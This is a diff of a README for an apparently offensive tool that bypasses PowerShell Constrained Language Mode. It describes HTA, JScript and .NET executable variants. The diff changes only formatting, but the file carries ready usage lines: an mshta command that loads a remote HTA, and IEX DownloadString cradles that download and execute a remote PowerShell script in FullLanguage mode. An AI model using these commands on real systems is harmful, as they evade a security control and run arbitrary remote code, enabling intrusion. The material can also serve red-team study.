@@ -9,15 +9,15 @@ Bypass Constrained Language Mode in PowerShell, based off of [SecJuice's](https:
 <hr>
 
 ### contents
-- CLMBypass.hta [A][C]
+- CLMBypass.hta **[AC]**
   - The WScript.Shell creates a new runspace
   - `payload.ps1` is downloaded and executed in FullLanguage mode
   - **Usage:** mshta.exe http://localhost/CLMBypass.hta`
-- CLMBypass.js [A][C]
+- CLMBypass.js **[AC]**
   - Realized this is redundant... the hta execution already creates another runspace with FullLanguage mode. Leaving it here just in case.
   - **Usage:** On line `131` you can add something like `o.Main("IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')");`
   - when the page is loaded, this will execute. If you use DotNetToJScript on your own, the functions and classes *must be public* and the class must have the `[ComVisible(true)]` tag (see Program.cs for an example).
-- CLMBypass.exe [C]
+- CLMBypass.exe **[C]**
   - Compiled as PE32 .NET Framework 4.0
   - **Usage:** `.\CLMBypass.exe "IEX(New-Object Net.WebClient).DownloadString('http://localhost/somescript.ps1')"`
 - Program.cs
